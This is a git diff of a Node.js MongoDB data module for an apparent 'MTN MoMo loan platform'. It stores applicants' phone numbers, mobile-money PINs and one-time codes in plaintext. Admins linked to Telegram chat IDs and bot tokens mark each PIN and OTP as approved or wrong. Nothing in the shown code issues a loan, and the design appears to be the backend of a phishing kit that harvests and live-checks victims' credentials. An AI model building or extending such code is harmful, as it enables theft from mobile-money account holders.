@@ -1,5 +1,4 @@
 const { MongoClient } = require('mongodb');
-require('dotenv').config();
 
 let client;
 let db;
@@ -8,158 +7,68 @@ let db;
 const DB_NAME = 'mtn_momo_loan_platform';
 const COLLECTIONS = {
     ADMINS: 'admins',
-    APPLICATIONS: 'applications',
-    ENVIRONMENT_LOGS: 'environment_logs'
+    APPLICATIONS: 'applications'
 };
 
 /**
- * Ensures DB connection is active before executing queries
- */
-async function ensureDb() {
-    if (!db) {
-        await connectDatabase();
-    }
-    if (!db) {
-        throw new Error('Database is not initialized or connected.');
-    }
-    return db;
-}
-
-/**
- * Connect to MongoDB with connection pooling safety
+ * Connect to MongoDB
  */
 async function connectDatabase() {
-    if (db) return db; // Return existing connection if initialized
-
     try {
-        const MONGODB_URI = process.env.MONGODB_URI || process.env.DATABASE_URL;
+        const MONGODB_URI = process.env.MONGODB_URI;
 
         if (!MONGODB_URI) {
             throw new Error('❌ MONGODB_URI is not set in environment variables');
         }
 
-        console.log('🔄 Connecting to MongoDB (MTN MoMo Platform)...');
+        console.log('🔄 Connecting to MongoDB...');
 
-        client = new MongoClient(MONGODB_URI, {
-            maxPoolSize: 10,
-            minPoolSize: 2,
-            serverSelectionTimeoutMS: 5000,
-            connectTimeoutMS: 10000
-        });
-
+        client = new MongoClient(MONGODB_URI);
         await client.connect();
+
         db = client.db(DB_NAME);
 
         console.log('✅ Connected to MongoDB successfully');
 
-        // Pass db instance directly to avoid re-triggering ensureDb()
-        await createIndexes(db);
-        await seedSuperAdmin(db);
+        await createIndexes();
 
         return db;
     } catch (error) {
         console.error('❌ MongoDB connection error:', error);
-        db = null; // Ensure db is null on failure
         throw error;
     }
 }
 
 /**
- * Seed Super Admin (ADMIN001) if not present
+ * Create database indexes
  */
-async function seedSuperAdmin(databaseInstance) {
+async function createIndexes() {
     try {
-        const database = databaseInstance || await ensureDb();
-        const superAdminExists = await database.collection(COLLECTIONS.ADMINS).findOne({ adminId: 'ADMIN001' });
-        if (!superAdminExists) {
-            const superAdminDocument = {
-                adminId: 'ADMIN001',
-                name: 'Super Admin',
-                email: 'admin@momo.cm',
-                chatId: null, // Will be linked when ADMIN001 runs /start
-                status: 'active',
-                createdAt: new Date().toISOString()
-            };
-            await database.collection(COLLECTIONS.ADMINS).insertOne(superAdminDocument);
-            console.log('⭐ Seeded default Super Admin (ADMIN001)');
-        }
-    } catch (error) {
-        console.error('⚠️ Error seeding super admin:', error.message);
-    }
-}
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
+        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
 
-/**
- * Create database indexes safely
- */
-async function createIndexes(databaseInstance) {
-    try {
-        const database = databaseInstance || await ensureDb();
-        await Promise.all([
-            database.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
-            database.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }, { sparse: true }),
-            database.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }, { sparse: true }),
-            database.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
+        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });
 
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true }),
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
-            database.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),
-
-            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
-            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 }),
-            database.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 })
-        ]);
-
-        console.log('✅ Database indexes verified');
+        console.log('✅ Database indexes created');
     } catch (error) {
         console.error('⚠️ Error creating indexes:', error.message);
     }
 }
 
 /**
- * Close database connection safely
+ * Close database connection
  */
 async function closeDatabase() {
     if (client) {
         await client.close();
-        db = null;
-        client = null;
         console.log('✅ Database connection closed');
-    }
-}
-
-// ==========================================
-// ENVIRONMENT LOGS OPERATIONS
-// ==========================================
-
-async function logAdminActivity(adminId, action, details = {}) {
-    try {
-        const database = await ensureDb();
-        const logEntry = {
-            adminId,
-            action,
-            details,
-            timestamp: new Date().toISOString()
-        };
-        await database.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
-    } catch (error) {
-        console.error('❌ Error recording environment log:', error.message);
-    }
-}
-
-async function getEnvironmentLogs(query = {}, limit = 100) {
-    try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.ENVIRONMENT_LOGS)
-            .find(query)
-            .sort({ timestamp: -1 })
-            .limit(limit)
-            .toArray();
-    } catch (error) {
-        console.error('❌ Error getting environment logs:', error);
-        return [];
     }
 }
 
@@ -169,37 +78,37 @@ async function getEnvironmentLogs(query = {}, limit = 100) {
 
 async function saveAdmin(adminData) {
     try {
-        const database = await ensureDb();
         const adminId = adminData.adminId || adminData.id;
 
-        if (!adminId) throw new Error('Admin ID is required');
+        if (!adminId)        throw new Error('Admin ID is required (adminId or id property)');
         if (!adminData.name) throw new Error('Admin name is required');
+        if (!adminData.email) throw new Error('Admin email is required');
+        if (!adminData.chatId) throw new Error('Admin chatId is required');
 
-        const normalizedChatId = adminData.chatId !== undefined && adminData.chatId !== null 
-            ? (typeof adminData.chatId === 'number' ? adminData.chatId : String(adminData.chatId).trim()) 
-            : null;
+        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
 
         const adminDocument = {
             adminId,
             name:      adminData.name,
-            email:     adminData.email || '',
-            chatId:    normalizedChatId,
+            email:     adminData.email,
+            chatId:    adminData.chatId,
             status:    adminData.status || 'active',
-            updatedAt: new Date().toISOString()
+            createdAt: adminData.createdAt || new Date().toISOString()
         };
 
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
-            { adminId },
-            { 
-                $set: adminDocument,
-                $setOnInsert: { createdAt: adminData.createdAt ? new Date(adminData.createdAt).toISOString() : new Date().toISOString() } 
-            },
-            { upsert: true }
-        );
+        if (adminData.botToken) adminDocument.botToken = adminData.botToken;
 
-        await logAdminActivity(adminId, 'ADMIN_SAVED', { name: adminData.name, email: adminData.email });
+        console.log(`💾 Saving admin to database:`, {
+            adminId: adminDocument.adminId,
+            name:    adminDocument.name,
+            email:   adminDocument.email,
+            chatId:  adminDocument.chatId,
+            status:  adminDocument.status
+        });
 
-        console.log(`✅ Admin saved/updated successfully: ${adminId} (${adminData.name})`);
+        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
+        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
         return result;
     } catch (error) {
         console.error('❌ Error saving admin:', error);
@@ -209,8 +118,7 @@ async function saveAdmin(adminData) {
 
 async function getAdmin(adminId) {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.ADMINS).findOne({ adminId });
+        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
     } catch (error) {
         console.error('❌ Error getting admin:', error);
         return null;
@@ -218,18 +126,8 @@ async function getAdmin(adminId) {
 }
 
 async function getAdminByChatId(chatId) {
-    if (!chatId) return null;
     try {
-        const database = await ensureDb();
-        const strChatId = String(chatId).trim();
-        const numChatId = Number(strChatId);
-
-        return await database.collection(COLLECTIONS.ADMINS).findOne({
-            $or: [
-                { chatId: strChatId },
-                { chatId: isNaN(numChatId) ? strChatId : numChatId }
-            ]
-        });
+        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
     } catch (error) {
         console.error('❌ Error getting admin by chat ID:', error);
         return null;
@@ -238,10 +136,9 @@ async function getAdminByChatId(chatId) {
 
 async function getAllAdmins() {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.ADMINS)
+        return await db.collection(COLLECTIONS.ADMINS)
             .find({})
-            .sort({ createdAt: 1 })
+            .sort({ createdAt: -1 })
             .toArray();
     } catch (error) {
         console.error('❌ Error getting admins:', error);
@@ -251,8 +148,7 @@ async function getAllAdmins() {
 
 async function getActiveAdmins() {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.ADMINS)
+        return await db.collection(COLLECTIONS.ADMINS)
             .find({ status: 'active' })
             .toArray();
     } catch (error) {
@@ -263,19 +159,10 @@ async function getActiveAdmins() {
 
 async function updateAdmin(adminId, updates) {
     try {
-        const database = await ensureDb();
-        const payload = { ...updates, updatedAt: new Date().toISOString() };
-        if (payload.chatId !== undefined && payload.chatId !== null) {
-            payload.chatId = typeof payload.chatId === 'number' ? payload.chatId : String(payload.chatId).trim();
-        }
-
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
+        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
-            { $set: payload }
+            { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
-        
-        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);
-
         console.log(`🔄 Admin ${adminId} updated`);
         return result;
     } catch (error) {
@@ -286,14 +173,10 @@ async function updateAdmin(adminId, updates) {
 
 async function updateAdminStatus(adminId, status) {
     try {
-        const database = await ensureDb();
-        const result = await database.collection(COLLECTIONS.ADMINS).updateOne(
+        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
             { adminId },
             { $set: { status, updatedAt: new Date().toISOString() } }
         );
-        
-        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });
-
         console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
         return result;
     } catch (error) {
@@ -304,11 +187,7 @@ async function updateAdminStatus(adminId, status) {
 
 async function deleteAdmin(adminId) {
     try {
-        const database = await ensureDb();
-        const result = await database.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
-        
-        await logAdminActivity(adminId, 'ADMIN_DELETED', {});
-
+        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
         console.log(`🗑️ Admin deleted: ${adminId}`);
         return result;
     } catch (error) {
@@ -319,8 +198,7 @@ async function deleteAdmin(adminId) {
 
 async function adminExists(adminId) {
     try {
-        const database = await ensureDb();
-        const count = await database.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
+        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
         return count > 0;
     } catch (error) {
         console.error('❌ Error checking admin existence:', error);
@@ -330,8 +208,7 @@ async function adminExists(adminId) {
 
 async function getAdminCount() {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.ADMINS).countDocuments({});
+        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
     } catch (error) {
         console.error('❌ Error getting admin count:', error);
         return 0;
@@ -344,28 +221,20 @@ async function getAdminCount() {
 
 async function saveApplication(appData) {
     try {
-        const database = await ensureDb();
-        const document = {
-            id:              appData.id,
-            adminId:         appData.adminId,
-            adminName:       appData.adminName || '',
-            phoneNumber:     appData.phoneNumber,
-            pin:             appData.pin,
-            pinStatus:       appData.pinStatus  || 'pending',
-            otpStatus:       appData.otpStatus  || 'pending',
-            otp:             appData.otp        || null,
-            assignmentType:  appData.assignmentType || 'auto',
+        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
+            id:             appData.id,
+            adminId:        appData.adminId,
+            adminName:      appData.adminName,
+            phoneNumber:    appData.phoneNumber,
+            pin:            appData.pin,
+            pinStatus:      appData.pinStatus  || 'pending',
+            otpStatus:      appData.otpStatus  || 'pending',
+            otp:            appData.otp        || null,
+            assignmentType: appData.assignmentType,
             isReturningUser: appData.isReturningUser || false,
-            previousCount:   appData.previousCount   || 0,
-            timestamp:       appData.timestamp || new Date().toISOString()
-        };
-
-        const result = await database.collection(COLLECTIONS.APPLICATIONS).insertOne(document);
-
-        if (appData.adminId) {
-            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
-        }
-
+            previousCount:  appData.previousCount   || 0,
+            timestamp:      appData.timestamp || new Date().toISOString()
+        });
         console.log(`💾 Application saved: ${appData.id}`);
         return result;
     } catch (error) {
@@ -376,8 +245,7 @@ async function saveApplication(appData) {
 
 async function getApplication(applicationId) {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
+        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
     } catch (error) {
         console.error('❌ Error getting application:', error);
         return null;
@@ -386,17 +254,10 @@ async function getApplication(applicationId) {
 
 async function updateApplication(applicationId, updates) {
     try {
-        const database = await ensureDb();
-        const result = await database.collection(COLLECTIONS.APPLICATIONS).updateOne(
+        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
             { $set: { ...updates, updatedAt: new Date().toISOString() } }
         );
-
-        const app = await getApplication(applicationId);
-        if (app && app.adminId) {
-            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
-        }
-
         console.log(`🔄 Application updated: ${applicationId}`);
         return result;
     } catch (error) {
@@ -407,8 +268,7 @@ async function updateApplication(applicationId, updates) {
 
 async function getApplicationsByAdmin(adminId) {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.APPLICATIONS)
+        return await db.collection(COLLECTIONS.APPLICATIONS)
             .find({ adminId })
             .sort({ timestamp: -1 })
             .toArray();
@@ -420,8 +280,7 @@ async function getApplicationsByAdmin(adminId) {
 
 async function getPendingApplications(adminId) {
     try {
-        const database = await ensureDb();
-        return await database.collection(COLLECTIONS.APPLICATIONS)
+        return await db.collection(COLLECTIONS.APPLICATIONS)
             .find({
                 adminId,
                 $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
@@ -440,35 +299,12 @@ async function getPendingApplications(adminId) {
 
 async function getAdminStats(adminId) {
     try {
-        const database = await ensureDb();
-        const stats = await database.collection(COLLECTIONS.APPLICATIONS).aggregate([
-            { $match: { adminId } },
-            {
-                $group: {
-                    _id: null,
-                    total: { $sum: 1 },
-                    pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
-                    pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
-                    otpPending: {
-                        $sum: {
-                            $cond: [
-                                { $and: [{ $eq: ['$otpStatus', 'pending'] }, { $eq: ['$pinStatus', 'approved'] }] },
-                                1,
-                                0
-                            ]
-                        }
-                    },
-                    fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } }
-                }
-            }
-        ]).toArray();
-
-        if (stats.length > 0) {
-            const { _id, ...counts } = stats[0];
-            return counts;
-        }
-
-        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
+        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
+        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
+        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
+        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
+        return { total, pinPending, pinApproved, otpPending, fullyApproved };
     } catch (error) {
         console.error('❌ Error getting admin stats:', error);
         return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
@@ -477,48 +313,20 @@ async function getAdminStats(adminId) {
 
 async function getStats() {
     try {
-        const database = await ensureDb();
-        const [totalAdmins, appStats] = await Promise.all([
-            database.collection(COLLECTIONS.ADMINS).countDocuments({}),
-            database.collection(COLLECTIONS.APPLICATIONS).aggregate([
-                {
-                    $group: {
-                        _id: null,
-                        totalApplications: { $sum: 1 },
-                        pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
-                        pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
-                        otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
-                        fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } },
-                        totalRejected: {
-                            $sum: {
-                                $cond: [
-                                    {
-                                        $or: [
-                                            { $eq: ['$pinStatus', 'rejected'] },
-                                            { $eq: ['$otpStatus', 'wrongpin_otp'] },
-                                            { $eq: ['$otpStatus', 'wrongcode'] }
-                                        ]
-                                    },
-                                    1,
-                                    0
-                                ]
-                            }
-                        }
-                    }
-                }
-            ]).toArray()
-        ]);
-
-        const counts = appStats[0] || {};
-        return {
-            totalAdmins,
-            totalApplications: counts.totalApplications || 0,
-            pinPending:        counts.pinPending || 0,
-            pinApproved:       counts.pinApproved || 0,
-            otpPending:        counts.otpPending || 0,
-            fullyApproved:     counts.fullyApproved || 0,
-            totalRejected:     counts.totalRejected || 0
-        };
+        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
+        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
+        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
+        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
+        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
+        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
+        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
+            $or: [
+                { pinStatus: 'rejected' },
+                { otpStatus: 'wrongpin_otp' },
+                { otpStatus: 'wrongcode' }
+            ]
+        });
+        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
     } catch (error) {
         console.error('❌ Error getting stats:', error);
         return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
@@ -545,8 +353,7 @@ async function getPerAdminStats() {
 
 async function getAllAdminsDetailed() {
     try {
-        const database = await ensureDb();
-        const admins = await database.collection(COLLECTIONS.ADMINS)
+        const admins = await db.collection(COLLECTIONS.ADMINS)
             .find({})
             .sort({ createdAt: -1 })
             .toArray();
@@ -563,12 +370,13 @@ async function getAllAdminsDetailed() {
 
 async function cleanupInvalidAdmins() {
     try {
-        const database = await ensureDb();
-        const result = await database.collection(COLLECTIONS.ADMINS).deleteMany({
+        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
             $or: [
                 { adminId: { $exists: false } },
                 { adminId: null },
-                { adminId: '' }
+                { adminId: '' },
+                { chatId: { $exists: false } },
+                { chatId: null }
             ]
         });
         console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
@@ -582,8 +390,6 @@ async function cleanupInvalidAdmins() {
 module.exports = {
     connectDatabase,
     closeDatabase,
-    ensureDb,
-    COLLECTIONS,
 
     saveAdmin,
     getAdmin,
@@ -601,9 +407,6 @@ module.exports = {
     updateApplication,
     getApplicationsByAdmin,
     getPendingApplications,
-
-    logAdminActivity,
-    getEnvironmentLogs,
 
     getAdminStats,
     getStats,
